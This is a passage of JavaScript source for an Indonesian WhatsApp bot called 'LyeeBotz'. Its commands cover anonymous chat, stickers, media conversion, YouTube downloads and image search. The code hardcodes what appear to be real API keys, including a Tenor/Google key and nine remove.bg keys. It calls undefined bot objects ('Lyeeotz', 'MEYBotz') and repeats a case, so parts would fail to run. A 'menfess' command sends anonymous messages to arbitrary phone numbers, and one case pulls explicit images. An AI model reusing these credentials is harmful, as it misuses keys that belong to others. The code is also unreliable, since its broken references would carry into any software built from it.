	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
	    case 'anonymous': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                LyeeBotz.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await LyeeBotz.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, LyeeBotz.user.name, m)
            }
			break
            case 'keluar': case 'leave': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await LyeeBotz.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await LyeeBotz.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'mulai': case 'start': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await Lyeeotz.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, LyeeBotz.user.name, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await LyeeBotz.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, MEYBotz.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await LyeeBotz.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, LyeeBotz.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await LyeeBotz.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, LyeeBotz.user.name, m)
                }
                break
            }
            case 'next': case 'lanjut': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await LyeeBotz.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await LyeeBotz.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await LyeeBotz.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, LyeeBotz.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await LyeeBotz.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, LyeeBotz.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await LyeeBotz.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, LyeeBotz.user.name, m)
                }
                break
            }
            case 'public': {
                if (!isCreator) throw mess.owner
                LyeeBotz.public = true
                m.reply('*Sukse Change To Public Usage*')
            }
            break
            case 'self': {
                if (!isCreator) throw mess.owner
                LyeeBotz.public = false
                m.reply('*Sukses Change To Self Usage*')
            }
            break
            case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break
            case 'speedtest': {
            m.reply('Testing Speed...')
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = await exec('python speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) m.reply(stdout)
        if (stderr.trim()) m.reply(stderr)
            }
            }
            break
            case 'owner': case 'creator': {
                LyeeBotz.sendContact(m.chat, global.owner, m)
            }
            break
            case 'setmenu': {
            if (!isCreator) throw mess.owner
            let setbot = db.data.settings[botNumber]
               if (args[0] === 'templateImage'){
                setbot.templateImage = true
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateVideo'){
                setbot.templateImage = false
                setbot.templateVideo = true
                setbot.templateGif = false
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateGif'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = true
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateMessage'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = true
                m.reply(mess.success)
                } else {
                let sections = [
                {
                title: "CHANGE MENU BOT",
                rows: [
                {title: "Template Image", rowId: `setmenu templateImage`, description: `Change menu bot to Template Image`},
                {title: "Template Video", rowId: `setmenu templateVideo`, description: `Change menu bot to Template Video`},
                {title: "Template Gif", rowId: `setmenu templateGif`, description: `Change menu bot to Template Gif`},
                {title: "Template Message", rowId: `setmenu templateMessage`, description: `Change menu bot to Template Message`}
                ]
                },
                ]
                LyeeBotz.sendListMsg(m.chat, `pilih aja *${pushname}* Setmenu nya!`, nyoutube, `*Hello Kak* !`, `Pilih Set Menu`, sections, m)
                }
            }
            break
            
//PEMBATAS=================LYEEHOST======================
            case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!quoted) throw `*Balas Video/Image Dengan Caption* ${prefix + command}`
            m.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await LyeeBotz.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('*Maksimal 10 detik!*')
                let media = await quoted.download()
                let encmedia = await LyeeBotz.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `*Kirim Gambar/Video Dengan Caption* ${prefix + command}\nDurasi *Video 1-9 Detik*`
                }
            }
            break
         case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await LyeeBotz.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	    case 'emojimix2': {
	    if (!text) throw `Example : ${prefix + command} 😅`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anu.results) {
		    let encmedia = await LyeeBotz.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	       case 'attp': case 'ttp': {
           if (!text) throw `Example : ${prefix + command} text`
           await LyeeBotz.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'MEYBotz', 'morou', m, {asSticker: true})

         }
         break
         case 'tts': {
         	if (!text) throw `Example : ${prefix + command} text`
             let tts = await fetchJson(`https://api.akuari.my.id/texttovoice/texttosound_id?query=${text}`)
             LyeeBotz.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mpeg', fileName: `${text}.mp3` }, { quoted: fvn })
         	}
         break
	       case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) throw respond
            if (!text) throw respond
	        m.reply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
            let { TelegraPh } = require('./lib/uploader')
            let mee = await LyeeBotz.downloadAndSaveMediaMessage(quoted)
            let mem = await TelegraPh(mee)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
	        let awikwok = await LyeeBotz.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(awikwok)
            }
	       break     
	        case 'simih': case 'simisimi': {
            if (!text) throw `Example : ${prefix + command} text`
            hm = await fetchJson(api('zenz', '/api/simisimi', { text : text }, 'apikey'))
            m.reply(hm.result.message)
            }
            break
            case 'toimage': case 'toimg': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
                let media = await LyeeBotz.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    MEYBotz.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case 'tomp4': case 'tovideo': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await LyeeBotz.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await LyeeBotz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            LyeeBotz.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            LyeeBotz.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${MEYBotz.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            LyeeBotz.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await LyeeBotz.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await LyeeBotz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
	        case 'tourl': {
                m.reply(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await LyeeBotz.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            case 'imagenobg': case 'removebg': case 'remove-bg': {
	    if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await LyeeBotz.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    LyeeBotz.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	case 'menfes': case 'menfess': {
		        if (m.isGroup) throw ('fitur tidak dapat digunakan di grup')
            	if (!text) throw `Example : ${prefix + command} 6282xxxxx|nama samaran|pesan`
            var mon = args.join(' ')
            var m1 = mon.split("|")[0]
            var m2 = mon.split("|")[1]
            var m3 = mon.split("|")[2]
               let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${author}`,jpegThumbnail: thumb}}}
               let mq1 = m1 + '@s.whatsapp.net'
               let kawk = ('PESAN RAHASIA')
               let ownernya = ownernomer + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
               let pjtxt = `Pesan Dari : ${m2} \nUntuk : @${mq1.split('@')[0]}\n\n${m3}`
               let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '❤THANKS' }, type: 1 }]
            await LyeeBotz.sendButtonText(m1 + '@s.whatsapp.net', buttons, pjtxt, kawk, m, {mentions: ments, quoted: kafloc})
            let akhji = `Pesan Telah Terkirim\nKe @${mq1.split('@')[0]}`
            await LyeeBotz.sendButtonText(m.chat, buttons, akhji, nyoutube, m, {mentions: ments})
            }
            break
	    case 'yts': case 'ytsearch': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `⌗ No : ${no++}\n⌗ Type : ${i.type}\n⌗ Video ID : ${i.videoId}\n⌗ Title : ${i.title}\n⌗ Views : ${i.views}\n⌗ Duration : ${i.timestamp}\n⌗ Upload At : ${i.ago}\n⌗ Author : ${i.author.name}\n⌗ Url : ${i.url}\n\n─────────────────\n\n`
                }
                LyeeBotz.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {
                if (!text) throw `Example : ${prefix + command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `⌗ *Title* : ${g.title}\n`
                teks += `⌗ *Description* : ${g.snippet}\n`
                teks += `⌗ *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
        case 'gimage': {
       if (!text) throw `Example : ${prefix + command} kaori cicak`
        anu = await fetchJson(`https://api.akuari.my.id/search/googleimage?query=${text}`)
        n = anu.result
        images = n[Math.floor(Math.random() * n.length)]
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
                    footer: LyeeBotz.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                LyeeBotz.sendMessage(m.chat, buttonMessage, { quoted: m })
        }
        break
	    case 'play': case 'ytplay': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
                    {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: `
⌗ Title : ${anu.title}
⌗ Ext : Search
⌗ ID : ${anu.videoId}
⌗ Duration : ${anu.timestamp}
⌗ Viewers : ${anu.views}
⌗ Upload At : ${anu.ago}
⌗ Author : ${anu.author.name}
⌗ Channel : ${anu.author.url}
⌗ Description : ${anu.description}
⌗ Url : ${anu.url}`,
                    footer: LyeeBotz.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                LyeeBotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'ytmp3': case 'ytaudio': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                LyeeBotz.sendImage(m.chat, media.thumb, `⌗ Title : ${media.title}\n⌗ File Size : ${media.filesizeF}\n⌗ Url : ${isUrl(text)}\n⌗ Ext : MP3\n⌗ Resolusi : ${args[1] || '128kbps'}`, m)
                LyeeBotz.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'ytmp4': case 'ytvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                LyeeBotz.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⌗ Title : ${media.title}\n⌗ File Size : ${media.filesizeF}\n⌗ Url : ${isUrl(text)}\n⌗ Ext : MP3\n⌗ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
case 'autosw': {
if (!isCreator) return m.reply('Khusus owner')
if (LyeeBotz.autosw) {
LyeeBotz.autosw = false
m.reply('Auto SW sekarang tidak Aktif')
} else if (!LyeeBotz.autosw) {
LyeeBotz.autosw = true
m.reply('Auto SW sekarang Aktif')
}
} 
break;
	    case 'getmusic': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
		let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                LyeeBotz.sendImage(m.chat, media.thumb, `⌗ Title : ${media.title}\n⌗ File Size : ${media.filesizeF}\n⌗ Url : ${urls[text - 1]}\n⌗ Ext : MP3\n⌗ Resolusi : ${args[1] || '128kbps'}`, m)
                LyeeBotz.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'getvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                MEYBotz.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⌗ Title : ${media.title}\n⌗ File Size : ${media.filesizeF}\n⌗ Url : ${urls[text - 1]}\n⌗ Ext : MP3\n⌗ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
            case 'pinterest': {
                m.reply(mess.wait)
		let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                MEYBotz.sendMessage(m.chat, { image: { url: result }, caption: '⌗ Media Url : '+result }, { quoted: m })
            }
            break
case 'anime': case 'waifu': case 'husbu': case 'neko': case 'shinobu': case 'megumin': case 'waifus': case 'nekos': case 'trap': case 'blowjob': {
                m.reply(mess.wait)
                MEYBotz.sendMessage(m.chat, { image: { url: api('zenz', '/api/random/'+command, {}, 'apikey') }, caption: 'Generate Random ' + command }, { quoted: m })
            }
            break
            case 'waifu': {
            	m.reply(mess.wait)
                anu = await fetchJson(`https://waifu.pics/api/sfw/waifu`)
                buffer = await getBuffer(anu.url)
                let buttons = [{buttonId: `waifu`, buttonText: {displayText: 'Next Image'}, type: 1},{buttonId: `simplemenu`, buttonText: {displayText: '⬅️Back'}, type: 1}]
                let buttonMessage = {
                    image: buffer,
                    caption: `Random Waifu`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 4
                }
                MEYBotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'couple': {
                m.reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                MEYBotz.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                MEYBotz.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
            case 'coffe': case 'kopi': {
            let buttons = [
                    {buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕ Random Coffe`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 4
                }
                MEYBotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) throw 'Masukkan Query Title'
		let { wallpaper } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `⌗ Title : ${result.title}\n⌗ Category : ${result.type}\n⌗ Detail : ${result.source}\n⌗ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 4
                }
                MEYBotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'gcsearch': {
              if (!text) throw 'Masukkan Query Title'
                anu = await fetchJson(`https://api.akuari.my.id/search/carigc?query=${text}`)
                n = anu.result
                result = n[Math.floor(Math.random() * n.length)]
                let jwbn = `*Nama : ${result.nama}\n*Link : ${result.link}*`
		let buttons = [{ buttonId: `gcsearch ${text}`, buttonText: { displayText: 'Next' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, jwbn, nyoutube, m, {quoted: fgclink})
            }
            break
            case 'wikimedia': {
                if (!text) throw 'Masukkan Query Title'
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
